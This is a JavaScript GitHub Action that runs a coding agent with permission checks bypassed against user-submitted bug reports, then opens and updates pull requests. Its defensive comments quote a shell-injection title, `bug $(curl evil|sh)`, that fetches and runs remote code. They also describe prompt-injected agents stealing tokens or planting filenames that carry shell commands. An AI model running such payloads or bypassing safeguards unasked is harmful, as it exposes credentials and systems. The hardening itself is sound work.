import { execFileSync, execSync } from "node:child_process";
import { existsSync, mkdirSync, readFileSync, writeFileSync, rmSync } from "node:fs";
import { appendFileSync } from "node:fs";
import path from "node:path";
import {
  config,
  listFeatures,
  getFeature,
  getScreenshot,
  getConversationThread,
  setDeveloperNoteAgentSection,
  setStatus,
  emitAgentEvent,
} from "./reqio.mjs";
import { buildBrief, buildReviewBrief } from "./prompt.mjs";

// bypassPermissions is not optional in CI: -p alone still enforces permission
// checks, and a prompt the agent cannot display is a refusal to edit anything.
// Every supported agent needs its own version of this (Codex bypasses its
// sandbox, Gemini runs yolo) because none of them can ask a human here.
const DEFAULT_AGENT_COMMAND =
  "npx -y @anthropic-ai/claude-code@latest -p --permission-mode bypassPermissions";
const WORK_DIR = ".reqio-agent";
const QUESTIONS_FILE = path.join(WORK_DIR, "questions.md");

/**
 * The developer note has two zones: whatever a human wrote, then everything
 * this action wrote, split by AGENT_SECTION_MARKER at the start of a line.
 * The action owns its zone completely and replaces it on every run; it must
 * never touch the human's, which is the spec it was handed.
 *
 * Both markers are byte-identical to `copy.agent.agentSection.marker` and
 * `copy.agent.questions.marker` in the Reqio web app. If they drift, the
 * dashboard stops recognising the zone and the "Ask the reporter" affordance
 * silently disappears.
 *
 * The pull request line is written ABOVE the questions heading on purpose.
 * Questions run to the end of the note, so anything placed after them gets
 * parsed as a question and, via the one-click relay, sent to the end user.
 * That leaked an internal repository URL to a stranger.
 */
const AGENT_SECTION_MARKER = "## Reqio agent";
const QUESTIONS_MARKER = "### Questions for the reporter";

/** Splits a raw note into what the human wrote and what this action wrote. */
const splitAgentSection = (note) => {
  const text = note ?? "";
  const lines = text.split("\n");
  const index = lines.findIndex((line) => line.trim() === AGENT_SECTION_MARKER);
  if (index === -1) return { human: text, agent: null };
  return {
    human: lines.slice(0, index).join("\n"),
    agent: lines.slice(index + 1).join("\n"),
  };
};

const sh = (cmd, opts = {}) => execSync(cmd, { encoding: "utf8", stdio: "pipe", ...opts }).trim();
const shQuiet = (cmd, opts = {}) => {
  try {
    return { ok: true, out: sh(cmd, opts) };
  } catch (error) {
    return { ok: false, out: `${error.stdout ?? ""}${error.stderr ?? ""}`.trim() };
  }
};

/**
 * Runs a command from an argv array, never through a shell.
 *
 * `sh` interpolates into /bin/sh, which is fine for our own literals and NOT
 * fine for anything a stranger typed. A pull request title is end-user text
 * straight from the widget, and wrapping it in double quotes does not contain
 * it: sh still expands `$(...)` and backticks inside double quotes, and a
 * trailing backslash escapes the closing quote. A report titled
 * `bug $(curl evil|sh)` therefore executed in the customer's runner, with
 * GH_TOKEN and REQIO_API_KEY in the environment, which also walks straight
 * past the credential scrub that protects the agent subprocess.
 *
 * Anything carrying report text MUST go through this. There is no quoting
 * fix for the shell path, only argv.
 */
const run = (file, args, opts = {}) => {
  try {
    const out = execFileSync(file, args, { encoding: "utf8", stdio: "pipe", ...opts });
    return { ok: true, out: (out ?? "").toString().trim() };
  } catch (error) {
    return { ok: false, out: `${error.stdout ?? ""}${error.stderr ?? ""}`.trim() };
  }
};

const setOutput = (key, value) => {
  if (process.env.GITHUB_OUTPUT) appendFileSync(process.env.GITHUB_OUTPUT, `${key}=${value}\n`);
};

const bool = (raw) => String(raw).toLowerCase() === "true";

// ---------------------------------------------------------------------------
// merged mode: a human merged the agent's PR, so tell the reporter
// ---------------------------------------------------------------------------

const runMerged = async (cfg) => {
  const branch = process.env.REQIO_BRANCH || "";
  const prefix = process.env.REQIO_BRANCH_PREFIX || "reqio/feature-";
  if (!branch.startsWith(prefix)) {
    console.log(`[reqio] ${branch || "(no branch)"} is not an agent branch, nothing to do.`);
    setOutput("handled", "0");
    return;
  }
  const featureId = branch.slice(prefix.length);
  const completionKind = process.env.REQIO_COMPLETION_KIND || "NEXT_UPDATE";

  // Entering COMPLETED is what fires Reqio's notification to the reporter
  // (ADR 0012). This one call is the entire payoff of the loop.
  await setStatus(cfg, featureId, "COMPLETED", completionKind);
  console.log(`[reqio] ${featureId} marked COMPLETED (${completionKind}). Reporter notified.`);
  setOutput("handled", "1");
};

// ---------------------------------------------------------------------------
// poll mode
// ---------------------------------------------------------------------------

/**
 * The scope rule is not "bugs". A bug qualifies because it arrives
 * self-describing - screenshot, page URL, what broke - so the report itself is
 * the brief. A feature request is a wish until somebody writes the spec, and
 * the place they write it is the developer note, which the brief already
 * labels as trusted team input distinct from the untrusted reporter text.
 *
 * So: work on anything self-describing, or anything a human has briefed.
 *
 * This reads the HUMAN zone only. Previously the writeback replaced the whole
 * note, and this tested that the note did not START with agent-authored text.
 * The two combined into a trap: once the agent wrote back, a briefed request
 * looked un-briefed forever, so its draft could never be resumed and the spec
 * a human wrote was already gone. Splitting the zones is what lets this ask
 * the only question it ever meant to ask: did a human write a spec?
 */
const isWorkable = (feature) => {
  if (feature.category === "ERROR") return true;
  return splitAgentSection(feature.developerNote).human.trim().length > 0;
};

/**
 * An open draft is retryable, which is what lets a half-finished attempt be
 * picked back up. But a draft that stopped to ASK something is not waiting on
 * a retry, it is waiting on a person, and retrying it changes nothing: the
 * agent re-reads the same unanswered thread and asks again.
 *
 * Left alone that ran the model, force-pushed the branch and re-fired the
 * "needs context" notification on every poll, forever, at the customer's
 * expense. So: hold while questions are outstanding, and release the moment
 * anyone says anything the agent has not seen. A human editing the brief to
 * answer inline also releases it, because that moves developerNoteUpdatedAt.
 */
const isWaitingOnReporter = (feature, thread) => {
  const { agent } = splitAgentSection(feature.developerNote);
  if (agent === null || !agent.includes(QUESTIONS_MARKER)) return false;

  const askedAt = Date.parse(feature.developerNoteUpdatedAt ?? "");
  // Without a timestamp there is no way to tell answered from unanswered.
  // Retrying forever is the worse failure, so hold and let a human resolve it.
  if (Number.isNaN(askedAt)) return true;

  return !(thread?.messages ?? []).some((message) => {
    const at = Date.parse(message.createdAt ?? "");
    return !Number.isNaN(at) && at > askedAt;
  });
};

/** The pull request on this branch, in any state, or null if there is none. */
const findPullRequest = (branch) => {
  const listed = run("gh", [
    "pr", "list",
    "--head", branch,
    "--state", "all",
    "--json", "number,url,state,isDraft",
    "--limit", "1",
  ]);
  if (!listed.ok) return null;
  const body = listed.out.trim();
  if (!body || body === "[]") return null;
  try {
    const [pr] = JSON.parse(body);
    return pr ?? null;
  } catch {
    // Unparseable output is not evidence of absence. Report a claim so a
    // duplicate is never opened on a guess.
    return { number: null, url: null, state: "UNKNOWN", isDraft: false };
  }
};

/**
 * Whether this request is spoken for. The branch is still the claim, but a
 * DRAFT pull request is not a claim - it is an unfinished attempt, and the
 * whole point of the questions flow is that a later run reads the reporter's
 * answer and resumes from that draft. Treating any pull request as final broke
 * that, and made a transient failure (a missing credential, a sandbox that
 * cannot start) cost the request permanently: the tombstone it left behind
 * could never be retried.
 *
 * So: a draft is retryable, a ready or merged or closed pull request is not.
 * A leftover branch with no pull request is retryable too - it means an earlier
 * run pushed and then failed to open one, which is exactly what happens when
 * the repository has not allowed Actions to create pull requests yet.
 */
const claimFor = (branch) => {
  const pr = findPullRequest(branch);
  if (pr) return { handled: !(pr.state === "OPEN" && pr.isDraft), pr };
  return { handled: false, pr: null };
};

const prepareWorkDir = (feature, screenshot) => {
  rmSync(WORK_DIR, { recursive: true, force: true });
  mkdirSync(WORK_DIR, { recursive: true });
  if (screenshot?.image) {
    const ext = screenshot.mimeType === "image/png" ? "png" : "jpg";
    writeFileSync(path.join(WORK_DIR, `screenshot.${ext}`), Buffer.from(screenshot.image, "base64"));
  }
  writeFileSync(path.join(WORK_DIR, "report.json"), JSON.stringify(feature, null, 2));
};

/**
 * The agent is driven by text a stranger wrote, so it is spawned WITHOUT the
 * credentials this action holds. `execSync` inherits the whole environment by
 * default, which would hand a prompt-injected agent the repo token and the
 * Reqio key. Only the model key and the ordinary runner variables survive.
 *
 * Denylist rather than allowlist on purpose: `agent-command` is user-swappable,
 * so an unknown provider's key must still reach the agent it belongs to.
 */
const SECRETS_WITHHELD_FROM_AGENT = [
  "GH_TOKEN",
  "GITHUB_TOKEN",
  "REQIO_API_KEY",
  "REQIO_PROJECT_ID",
  "REQIO_BASE_URL",
];

const agentEnv = () => {
  const env = { ...process.env };
  for (const key of SECRETS_WITHHELD_FROM_AGENT) delete env[key];
  return env;
};

/**
 * An OMITTED agent-command means "use the default". An explicitly EMPTY one
 * means the user picked a non-default agent and has not pasted its invocation
 * yet, so falling back to the default would launch Claude Code against, say,
 * an OPENAI_API_KEY and fail deep in the run with an unrelated-looking error.
 * `||` cannot tell those apart because "" is falsy; `??` plus a trim check can.
 */
const resolveAgentCommand = () => {
  const raw = process.env.REQIO_AGENT_COMMAND ?? DEFAULT_AGENT_COMMAND;
  const command = raw.trim();
  if (!command) {
    throw new Error(
      "agent-command is empty. Set it to your coding agent's headless invocation, " +
        "or remove the input entirely to use the default (Claude Code).",
    );
  }
  return command;
};

const runAgent = (brief) => {
  const command = resolveAgentCommand();
  try {
    const out = execSync(command, {
      input: brief,
      encoding: "utf8",
      stdio: ["pipe", "pipe", "pipe"],
      env: agentEnv(),
      maxBuffer: 64 * 1024 * 1024,
      timeout: 30 * 60 * 1000,
    });
    return { ok: true, log: out };
  } catch (error) {
    return { ok: false, log: `${error.stdout ?? ""}\n${error.stderr ?? ""}`.trim() || String(error) };
  }
};

const readQuestions = () => {
  if (!existsSync(QUESTIONS_FILE)) return null;
  const body = readFileSync(QUESTIONS_FILE, "utf8").trim();
  return body || null;
};

const hasCodeChanges = () => {
  // The agent's own scratch directory is never part of the change set.
  const status = shQuiet(`git status --porcelain -- . ":(exclude)${WORK_DIR}"`);
  return status.ok && status.out !== "";
};

const restoreTestFiles = () => {
  const changed = shQuiet("git diff --name-only");
  if (!changed.ok || !changed.out) return [];
  const testFiles = changed.out
    .split("\n")
    .filter((f) => /(^|\/)(tests?|__tests__|spec)\//.test(f) || /\.(test|spec)\.[a-z]+$/.test(f));
  // argv, not a shell string: the agent chooses these filenames, and an agent
  // acting on an injected instruction can create one containing shell
  // metacharacters purely to get it executed here.
  for (const file of testFiles) run("git", ["checkout", "--", file]);
  return testFiles;
};

const prBody = ({ feature, baseUrl, projectId, questions, testResult, agentFailed, changed }) => {
  // A real route, not a query parameter. `?feature=` renders the board with
  // nothing open, so every pull request the agent has opened so far carried a
  // link that silently went nowhere, and this is the reviewer's only path back
  // to the report it came from.
  const link = `${baseUrl}/dashboard/projects/${projectId}/features/${feature.id}`;
  const parts = [
    agentFailed && !changed
      ? "The agent could not complete this one. Opening as a draft so nothing is lost."
      : questions
        ? "The agent stopped before writing code because the report is missing detail."
        : feature.category === "ERROR"
          ? "Opened automatically from a Reqio bug report."
          : "Opened automatically from a Reqio request the team wrote a brief for.",
    "",
    `**Report:** ${feature.title}`,
    feature.pageUrl ? `**Page:** ${feature.pageUrl}` : "",
    `**Reqio thread:** ${link}`,
    "",
  ];
  if (agentFailed && changed) {
    parts.push(
      "> The agent exited with an error after writing this diff. The work is here and",
      "> looks finished, but nothing proves it is. The log is committed under",
      "> `.reqio-agent/` so you can see where it stopped. Read this one closely.",
      "",
    );
  }
  if (questions) parts.push("### Open questions", "", questions, "");
  if (testResult) {
    parts.push(
      "### Tests",
      "",
      testResult.ok ? "Passed inside the agent job." : "FAILED inside the agent job.",
      "",
      "```",
      testResult.out.slice(-3000),
      "```",
      "",
    );
  }
  // The second sentence must follow the test section that is actually present.
  // Pointing at "the test result above" when no test-command is configured
  // sends the reviewer looking for a check that was never run.
  parts.push(
    "> Your own CI does not run on this pull request: GitHub suppresses workflow triggers for",
    "> commits made with the default token, unless you have swapped in a PAT or GitHub App.",
    testResult
      ? "> The test result above is the check."
      : "> No test-command is configured, so nothing here has been verified by a machine.",
  );
  return parts.filter((p) => p !== "").join("\n");
};

const handleOne = async (cfg, summary, opts) => {
  const branch = `${opts.branchPrefix}${summary.id}`;
  const claim = claimFor(branch);
  if (claim.handled) {
    console.log(`[reqio] ${summary.id} already has ${branch}, skipping.`);
    return false;
  }
  if (claim.pr) {
    console.log(`[reqio] ${summary.id} has an unfinished draft, resuming ${claim.pr.url}`);
  }

  // Retrying an existing branch force-pushes over it, and --force-with-lease
  // needs a remote-tracking ref to lease against or it refuses on stale info.
  // Absent (a first attempt) is fine; the lease simply has nothing to compare.
  shQuiet(`git fetch origin ${branch}:refs/remotes/origin/${branch} --force`);

  const feature = await getFeature(cfg, summary.id);
  if (!isWorkable(feature)) {
    console.log(`[reqio] ${summary.id} is neither a bug nor briefed, skipping.`);
    return false;
  }

  // Auto mode picks up work nobody has moved yet, so the agent moves it itself.
  // That is what tells the reporter work has started, and it must happen before
  // the long agent run rather than after it.
  if (summary.status === "NEEDS_ACTION") {
    await setStatus(cfg, summary.id, "IN_PROGRESS");
  }

  const [screenshot, thread] = await Promise.all([
    getScreenshot(cfg, summary.id),
    getConversationThread(cfg, summary.id),
  ]);

  if (isWaitingOnReporter(feature, thread)) {
    console.log(`[reqio] ${summary.id} is waiting on an answer to the agent's questions, skipping.`);
    return false;
  }

  /**
   * Whether the attempt this run is about to replace already had code in it.
   * `checkout -B` resets the branch to base, so it has to be read while the
   * old tip is still reachable.
   */
  const priorAttempt = shQuiet(
    `git diff --name-only ${opts.baseBranch}...refs/remotes/origin/${branch} -- . ":(exclude)${WORK_DIR}"`,
  );
  /**
   * A FAILED check means "unknown", not "no code". The three-dot diff needs a
   * merge base, and the workflow Reqio generates checks out shallow, so on a
   * branch whose fork point was never fetched this errors rather than
   * answering. Reading that as "nothing to protect" reinstated the exact
   * clobbering this guard exists to prevent, on the default setup.
   *
   * So the guard fails safe: an attempt that produced nothing never overwrites
   * a branch we could not read.
   */
  const priorAttemptHasCode = priorAttempt.ok ? priorAttempt.out.trim() !== "" : true;

  sh(`git checkout -B ${branch} ${opts.baseBranch}`);
  prepareWorkDir(feature, screenshot);

  const brief = buildBrief({
    feature,
    thread,
    hasScreenshot: Boolean(screenshot?.image),
    allowTestEdits: opts.allowTestEdits,
    testCommand: opts.testCommand,
  });

  const agentRun = runAgent(brief);
  const questions = readQuestions();

  if (!opts.allowTestEdits) {
    const reverted = restoreTestFiles();
    if (reverted.length) console.log(`[reqio] reverted agent edits to ${reverted.length} test file(s).`);
  }

  const changed = hasCodeChanges();

  /**
   * Never force-push an empty attempt over one that had real code. The push is
   * unconditional otherwise, so a single transient model outage was enough to
   * replace a finished diff with a log file, and the work was gone with no
   * trace in the pull request that it had ever existed. Leaving the previous
   * attempt alone costs nothing: the request stays unclaimed and the next run
   * tries again from the same place.
   */
  if (!changed && priorAttemptHasCode) {
    console.log(
      `[reqio] ${feature.id}: this attempt produced nothing and the open one has code. Leaving it alone.`,
    );
    return false;
  }

  /**
   * A non-zero exit is not proof the agent failed. Gemini's CLI in particular
   * exits non-zero on teardown after writing a perfectly good diff, and gating
   * on that left every one of its pull requests a draft titled "wip:" saying
   * the agent could not finish. Worse, an open draft does not count as a claim,
   * so the next run picked the same request up and did it all again, forever.
   * The diff is the signal that work happened; the exit code only colours how
   * loudly the body warns about it.
   */
  const draft = Boolean(questions) || !changed;

  // Same credential scrub as the agent spawn: this command executes code the
  // agent just wrote, so it is no more trusted than the agent itself.
  let testResult = null;
  if (changed && opts.testCommand) testResult = shQuiet(opts.testCommand, { env: agentEnv() });

  // A draft with no diff still needs a commit for the branch to exist.
  rmSync(path.join(WORK_DIR, "report.json"), { force: true });
  if (!changed || !agentRun.ok) {
    // Keep the log whenever the agent errored, even when it also produced code.
    // That is precisely when a reviewer needs to see what it was doing when it
    // died, and deleting it left them a warning with no evidence behind it.
    // Rebuilt from scratch so the report screenshot stays out of the diff.
    rmSync(WORK_DIR, { recursive: true, force: true });
    mkdirSync(WORK_DIR, { recursive: true });
    writeFileSync(
      path.join(WORK_DIR, "agent-log.md"),
      `# Agent log\n\n${questions ? `## Questions\n\n${questions}\n\n` : ""}## Output\n\n\`\`\`\n${agentRun.log.slice(-6000)}\n\`\`\`\n`,
    );
  } else {
    rmSync(WORK_DIR, { recursive: true, force: true });
  }

  sh(`git add -A`);
  const subject = draft ? `wip: ${feature.title}` : `fix: ${feature.title}`;
  execFileSync("git", ["commit", "-m", subject.slice(0, 70), "-m", `Reqio request ${feature.id}`], {
    stdio: "pipe",
  });
  sh(`git push --force-with-lease origin ${branch}`);

  const body = prBody({
    feature,
    baseUrl: cfg.baseUrl,
    projectId: cfg.projectId,
    questions,
    testResult,
    agentFailed: !agentRun.ok,
    changed,
  });
  const bodyFile = path.join(process.env.RUNNER_TEMP || ".", `reqio-pr-${feature.id}.md`);
  writeFileSync(bodyFile, body);

  let prUrl;

  if (claim.pr) {
    // Resuming the draft this run inherited: the force-push already replaced
    // its commits, so only the title, body and draft state still need to catch
    // up with the new outcome. Opening a second pull request on the same head
    // is not possible anyway.
    const edited = run("gh", [
      "pr", "edit", String(claim.pr.number),
      "--title", subject,
      "--body-file", bodyFile,
    ]);
    if (!edited.ok) {
      console.error(`[reqio] could not update pull request for ${feature.id}: ${edited.out}`);
      return false;
    }
    // An attempt that now has code and no open questions has stopped being a
    // draft, and nobody will review what still looks unfinished.
    if (!draft) {
      const ready = run("gh", ["pr", "ready", String(claim.pr.number)]);
      if (!ready.ok) console.error(`[reqio] could not mark ${claim.pr.url} ready: ${ready.out}`);
    }
    prUrl = claim.pr.url;
  } else {
    const created = run("gh", [
      "pr", "create",
      "--base", opts.baseBranch,
      "--head", branch,
      "--title", subject,
      "--body-file", bodyFile,
      ...(draft ? ["--draft"] : []),
    ]);
    if (!created.ok) {
      console.error(`[reqio] could not open a pull request for ${feature.id}: ${created.out}`);
      return false;
    }
    prUrl = created.out.split("\n").filter(Boolean).pop();
  }

  // Writes ONLY this action's zone. The human's brief above the marker is
  // preserved by the server, which splices inside a row lock. The previous
  // whole-note PATCH destroyed the spec a human had written the moment a pull
  // request opened, which is also what made briefed requests unresumable.
  const agentSection = [
    `${questions ? "Draft pull" : "Pull"} request: ${prUrl}`,
    ...(questions ? ["", QUESTIONS_MARKER, questions] : []),
  ].join("\n");
  await setDeveloperNoteAgentSection(cfg, feature.id, agentSection);

  await emitAgentEvent(
    cfg,
    questions
      ? { kind: "agent.needs_context", featureId: feature.id, questions, draftPrUrl: prUrl }
      : { kind: "agent.pr_opened", featureId: feature.id, prUrl },
  );

  console.log(`[reqio] ${feature.id} -> ${prUrl}${draft ? " (draft)" : ""}`);
  return true;
};

const runPoll = async (cfg) => {
  const opts = {
    branchPrefix: process.env.REQIO_BRANCH_PREFIX || "reqio/feature-",
    autoApprove: bool(process.env.REQIO_AUTO_APPROVE),
    maxPrs: Math.max(1, Number(process.env.REQIO_MAX_PRS || "3")),
    testCommand: (process.env.REQIO_TEST_COMMAND || "").trim(),
    allowTestEdits: bool(process.env.REQIO_ALLOW_TEST_EDITS),
    baseBranch:
      (process.env.REQIO_BASE_BRANCH || "").trim() ||
      shQuiet("gh repo view --json defaultBranchRef -q .defaultBranchRef.name").out ||
      "main",
  };

  // Validate before touching the network or git: a misconfigured command should
  // fail on an empty run, not after branching and opening a pull request.
  resolveAgentCommand();

  // No category filter here: `isWorkable` decides per request, and it needs the
  // developer note, which only the detail endpoint returns.
  const approved = await listFeatures(cfg, { status: "IN_PROGRESS" });
  const pending = opts.autoApprove ? await listFeatures(cfg, { status: "NEEDS_ACTION" }) : [];
  const candidates = [...approved, ...pending];

  if (candidates.length === 0) {
    console.log("[reqio] no approved bugs waiting.");
    setOutput("handled", "0");
    return;
  }

  sh(`git config user.name "reqio-agent[bot]"`);
  sh(`git config user.email "agent@reqio.app"`);
  sh(`git fetch origin ${opts.baseBranch} --depth=1 || true`);

  let handled = 0;
  for (const candidate of candidates) {
    if (handled >= opts.maxPrs) {
      console.log(`[reqio] stopping at max-prs-per-run=${opts.maxPrs}. ${candidates.length - handled} left for the next run.`);
      break;
    }
    try {
      if (await handleOne(cfg, candidate, opts)) handled += 1;
    } catch (error) {
      // One bad report must not strand the rest of the queue.
      console.error(`[reqio] ${candidate.id} failed: ${error.message}`);
    } finally {
      shQuiet(`git checkout ${opts.baseBranch}`);
      shQuiet(`git reset --hard origin/${opts.baseBranch}`);
      rmSync(WORK_DIR, { recursive: true, force: true });
    }
  }
  setOutput("handled", String(handled));
};

// ---------------------------------------------------------------------------
// review mode: a human asked for changes on the agent's pull request
// ---------------------------------------------------------------------------

/**
 * Only people with push access get to drive the agent.
 *
 * On a public repository anyone can comment on a pull request, and every
 * triggered run spends the repository owner's model key inside their runner.
 * The workflow's `if:` gates on this as well, and that copy is the one that
 * saves the billed minute; this copy is the one that cannot be edited away by
 * someone loosening a YAML condition later.
 */
const TRUSTED_ASSOCIATIONS = new Set(["OWNER", "MEMBER", "COLLABORATOR"]);

const ghJson = (args) => {
  const res = run("gh", args);
  if (!res.ok) return null;
  try {
    return JSON.parse(res.out);
  } catch {
    return null;
  }
};

/**
 * Everything said after the branch last moved is unaddressed; everything said
 * before it has already been answered with code. Reading the watermark off the
 * branch tip means no state is stored anywhere, and it stays right when a human
 * pushes a fixup of their own.
 */
const lastPushAt = () => {
  const res = shQuiet("git log -1 --format=%cI HEAD");
  const at = res.ok ? Date.parse(res.out) : NaN;
  return Number.isNaN(at) ? 0 : at;
};

/**
 * Everything a trusted human has said on this pull request since the last push,
 * from all three places GitHub lets them say it: the conversation tab
 * (issue comments), inline comments on the diff, and the body of a submitted
 * review.
 *
 * The trigger keyword is deliberately NOT filtered here. It decides whether a
 * run starts; once one has, the agent should see all the feedback, including
 * the comments that did not think to address it by name.
 */
const gatherFeedback = (repo, number, since) => {
  const issue = (ghJson(["api", `repos/${repo}/issues/${number}/comments`, "--paginate"]) ?? []).map((c) => ({
    body: c.body,
    author: c.user?.login,
    userType: c.user?.type,
    association: c.author_association,
    createdAt: c.created_at,
    path: null,
    line: null,
    diffHunk: null,
  }));
  const inline = (ghJson(["api", `repos/${repo}/pulls/${number}/comments`, "--paginate"]) ?? []).map((c) => ({
    body: c.body,
    author: c.user?.login,
    userType: c.user?.type,
    association: c.author_association,
    createdAt: c.created_at,
    path: c.path,
    line: c.line ?? c.original_line,
    diffHunk: c.diff_hunk,
  }));
  const reviews = (ghJson(["api", `repos/${repo}/pulls/${number}/reviews`, "--paginate"]) ?? []).map((r) => ({
    body: r.body,
    author: r.user?.login,
    userType: r.user?.type,
    association: r.author_association,
    createdAt: r.submitted_at,
    path: null,
    line: null,
    diffHunk: null,
  }));

  return [...issue, ...inline, ...reviews]
    .filter((row) => (row.body ?? "").trim())
    // Its own comments are not feedback. Without this the agent answers itself.
    .filter((row) => row.userType !== "Bot")
    .filter((row) => TRUSTED_ASSOCIATIONS.has(row.association))
    .filter((row) => {
      const at = Date.parse(row.createdAt ?? "");
      return !Number.isNaN(at) && at > since;
    })
    .sort((a, b) => Date.parse(a.createdAt) - Date.parse(b.createdAt));
};

const reviewComment = ({ questions, testResult, agentFailed, changed }) => {
  const parts = [
    changed
      ? "Pushed a commit addressing the review feedback above."
      : questions
        ? "I stopped without changing anything, because answering this would have meant guessing."
        : "I ran against this feedback and it did not produce a change. Nothing has been pushed.",
  ];
  if (agentFailed && changed) {
    parts.push(
      "",
      "> The agent exited with an error after writing this diff. The work looks",
      "> finished but nothing proves it is. Read this one closely.",
    );
  }
  if (questions) parts.push("", "### Open questions", "", questions);
  if (testResult) {
    parts.push(
      "",
      "### Tests",
      "",
      testResult.ok ? "Passed inside the agent job." : "FAILED inside the agent job.",
      "",
      "```",
      testResult.out.slice(-3000),
      "```",
    );
  }
  return parts.join("\n");
};

const postReviewComment = (number, body) => {
  const file = path.join(process.env.RUNNER_TEMP || ".", `reqio-review-${number}.md`);
  writeFileSync(file, body);
  const posted = run("gh", ["pr", "comment", String(number), "--body-file", file]);
  if (!posted.ok) console.error(`[reqio] could not comment on #${number}: ${posted.out}`);
};

const runReview = async (cfg) => {
  const number = (process.env.REQIO_PR_NUMBER || "").trim();
  // Digits only. It reaches gh and git as argv either way, but a pull request
  // number that is not a number means the workflow is wired wrong, and failing
  // here is clearer than a confusing gh error three calls later.
  if (!/^\d+$/.test(number)) {
    throw new Error("pr-number must be the number of the pull request being reviewed.");
  }
  const prefix = process.env.REQIO_BRANCH_PREFIX || "reqio/feature-";
  const repo = process.env.GITHUB_REPOSITORY || "";
  const opts = {
    testCommand: (process.env.REQIO_TEST_COMMAND || "").trim(),
    allowTestEdits: bool(process.env.REQIO_ALLOW_TEST_EDITS),
  };
  resolveAgentCommand();

  const pr = ghJson(["pr", "view", number, "--json", "headRefName,url,state,isDraft,number"]);

  /**
   * The issue_comment payload carries no branch, only an issue number, so the
   * workflow cannot filter on the branch prefix in its `if:`. This line is the
   * first moment the job can tell whether the comment was even on an agent
   * pull request, which means every unrelated comment in the repository gets
   * this far. Keep everything above it cheap.
   */
  if (!pr || pr.state !== "OPEN" || !pr.headRefName?.startsWith(prefix)) {
    console.log(`[reqio] #${number} is not an open agent pull request, nothing to do.`);
    setOutput("handled", "0");
    return;
  }
  const featureId = pr.headRefName.slice(prefix.length);

  const checkout = run("gh", ["pr", "checkout", number, "--force"]);
  if (!checkout.ok) {
    console.error(`[reqio] could not check out #${number}: ${checkout.out}`);
    setOutput("handled", "0");
    return;
  }

  const feedback = gatherFeedback(repo, number, lastPushAt());
  if (!feedback.length) {
    console.log(`[reqio] #${number} has nothing new from a collaborator since the last push.`);
    setOutput("handled", "0");
    return;
  }

  sh(`git config user.name "reqio-agent[bot]"`);
  sh(`git config user.email "agent@reqio.app"`);

  const feature = await getFeature(cfg, featureId);
  const diff = run("gh", ["pr", "diff", number]);

  rmSync(WORK_DIR, { recursive: true, force: true });
  mkdirSync(WORK_DIR, { recursive: true });

  const agentRun = runAgent(
    buildReviewBrief({
      feature,
      diff: diff.ok ? diff.out : "",
      comments: feedback,
      allowTestEdits: opts.allowTestEdits,
      testCommand: opts.testCommand,
    }),
  );
  const questions = readQuestions();

  if (!opts.allowTestEdits) {
    const reverted = restoreTestFiles();
    if (reverted.length) console.log(`[reqio] reverted agent edits to ${reverted.length} test file(s).`);
  }

  const changed = hasCodeChanges();
  rmSync(WORK_DIR, { recursive: true, force: true });

  if (!changed) {
    // Say so on the pull request rather than silently. A reviewer who asked for
    // a change and hears nothing back assumes the run is still going.
    postReviewComment(number, reviewComment({ questions, testResult: null, agentFailed: !agentRun.ok, changed }));
    console.log(`[reqio] #${number}: no change produced.`);
    setOutput("handled", "0");
    return;
  }

  let testResult = null;
  if (opts.testCommand) testResult = shQuiet(opts.testCommand, { env: agentEnv() });

  sh("git add -A");
  execFileSync("git", ["commit", "-m", "fix: address review feedback", "-m", `Reqio request ${featureId}`], {
    stdio: "pipe",
  });

  /**
   * A plain push, never --force. Poll mode force-pushes because it rebuilds the
   * branch from base; this mode adds a commit on top of the exact head the
   * reviewer read. If someone pushed in between, losing the race is the correct
   * outcome and the reviewer is told rather than quietly overwritten.
   */
  const pushed = run("git", ["push", "origin", `HEAD:${pr.headRefName}`]);
  if (!pushed.ok) {
    console.error(`[reqio] could not push to ${pr.headRefName}: ${pushed.out}`);
    postReviewComment(
      number,
      "I wrote a change for the feedback above but could not push it: the branch moved while I was working. Comment again and I will redo it against the new head.",
    );
    setOutput("handled", "0");
    return;
  }

  postReviewComment(number, reviewComment({ questions, testResult, agentFailed: !agentRun.ok, changed }));

  // Code and no open questions means it has stopped being a work in progress.
  if (pr.isDraft && !questions) {
    const ready = run("gh", ["pr", "ready", number]);
    if (!ready.ok) console.error(`[reqio] could not mark ${pr.url} ready: ${ready.out}`);
  }

  /**
   * Rewrites this action's note zone so the request in Reqio still points at the
   * pull request. Review questions are deliberately NOT written under
   * QUESTIONS_MARKER: everything under that heading is offered to the team as
   * one-click relay TO THE REPORTER, and a question about the shape of a code
   * change is for the colleague who is reviewing it, not for the stranger who
   * reported the bug. They go on the pull request and stay there.
   */
  await setDeveloperNoteAgentSection(
    cfg,
    featureId,
    `Pull request: ${pr.url}\nLast updated from review feedback on the pull request.`,
  );

  console.log(`[reqio] #${number} updated from ${feedback.length} review comment(s).`);
  setOutput("handled", "1");
};

const main = async () => {
  const cfg = config();
  const mode = process.env.REQIO_MODE || "poll";
  if (mode === "merged") return runMerged(cfg);
  if (mode === "review") return runReview(cfg);
  return runPoll(cfg);
};

main().catch((error) => {
  console.error(`[reqio] ${error.message}`);
  process.exit(1);
});
